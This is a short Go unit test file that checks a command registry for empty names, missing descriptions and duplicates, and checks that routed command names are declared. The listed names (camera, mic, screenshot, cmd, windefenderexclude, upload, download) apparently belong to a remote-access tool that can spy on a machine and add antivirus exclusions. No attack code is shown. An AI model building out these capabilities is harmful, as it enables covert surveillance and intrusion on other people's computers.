package commands

import "testing"

func TestDefinitionsAreUniqueAndDocumented(t *testing.T) {
	seen := make(map[string]bool)
	for _, cmd := range Definitions() {
		if cmd.Name == "" {
			t.Fatal("command with empty name")
		}
		if cmd.Description == "" {
			t.Errorf("%s: empty description", cmd.Name)
		}
		if seen[cmd.Name] {
			t.Errorf("duplicate command %q", cmd.Name)
		}
		seen[cmd.Name] = true
	}
}

func TestAllRoutedCommandsHaveDefinitions(t *testing.T) {
	defined := make(map[string]bool)
	for _, cmd := range Definitions() {
		defined[cmd.Name] = true
	}
	for _, name := range []string{
		"help", "cmd", "screenshot", "camera", "mic", "record", "recordstop",
		"log", "cwd", "ls", "ps", "pidinfo", "winsec", "winfirewall",
		"windefender", "windefenderexclude", "download", "upload", "restart",
	} {
		if !defined[name] {
			t.Errorf("router handles %q but Definitions() does not declare it", name)
		}
	}
}
